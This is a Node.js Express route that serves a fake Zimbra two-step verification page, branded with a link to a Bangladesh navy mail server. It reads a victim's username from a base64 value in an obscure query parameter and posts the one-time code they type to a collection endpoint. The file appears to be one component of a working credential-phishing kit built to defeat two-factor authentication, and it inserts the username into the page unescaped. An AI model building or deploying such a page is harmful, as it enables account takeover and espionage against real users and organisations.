
const express = require ('express');
const router = express.Router();


router.use(express.static('public'));



//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {

    const data3 = req.query.gdjfghfdhgjfdgfdgkldfjgkldfjlgdkjglkjfdl;
   const username = Buffer.from(data3, 'base64').toString('utf-8');

	if (data3 == null) {
        res.render('error');
        
      }else{
    const htmlContent = `
  <!DOCTYPE html>
<html class="user_font_size_normal" lang="en"><head>

	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Zimbra Web Client Sign In</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<meta name="apple-mobile-web-app-status-bar-style" content="black">
	<link rel="stylesheet" type="text/css" href="/stylesheet/common,login,zhtml,skin.css">
	<link rel="SHORTCUT ICON" href="/images/logo/favicon.ico">


</head>
<body onload="onLoad();">

	<div id="modifiedLogin" class="LoginScreen">
		<div class="modernCenter">
                <div class="modernContentBox">
                    <div class="logo">
                        <a href="http://mail.navy.mil.bd/" id="bannerLink" target="_new" title="Zimbra"><span class="ScreenReaderOnly">Zimbra</span>
                            <span class="ImgLoginBanner"></span>
                        </a>
                    </div>				
				<form id="zLoginForm" method="post" name="loginForm" action="/req/codepost" accept-charset="UTF-8">
								<input type="hidden" name="loginOp" value="login">
								<input type="hidden" name="login_csrf" value="26ea6adf-f09d-4562-b770-b434ee2bda2a">

								<!-- if user has selected remember me in login page and we are showing totp screen to user, then we need to maintain value of that flag as after successfull two factor authentication we will have to rewrite ZM_AUTH_TOKEN with correct expires headers -->
									<input type="hidden" name="zrememberme" value="">
								<div class="twoFactorTitle">Using two-step authentication</div>
                        <div class="twoFactorForm">
                                <div>
                                    <label class="zLoginFieldLabel" for="totpcode" style="float: left;">Code</label>
                                     <input id="username" tabindex="1" class="zLoginFieldInput" name="username" value="${username}" type="hidden" size="40" maxlength="1024" autocapitalize="none" autocorrect="off">
                                   <input tabindex="0" class="zLoginFieldInput" id="totpcode" name="totpcode" type="text" size="40" maxlength="1024" autocomplete="off" onkeyup="disableEnable(this)">
                                </div>
                                <div class="verifyButtonWrapper">
                                    <div>
                                        <input id="verifyButton" class="loginButton ZLoginButton DwtButton" tabindex="2" type="submit" value="Verify">
                                    </div>
                                </div>
                        </div>
                    </form>
			</div>
			<div class="decor1"></div>
		</div>

		<div class="Footer">
			<div id="ZLoginNotice" class="legalNotice-small">Copyright © 2005-2023 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</div>
		</div>
		<div class="decor2"></div>
	</div>


</body></html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);
      }
});




module.exports =router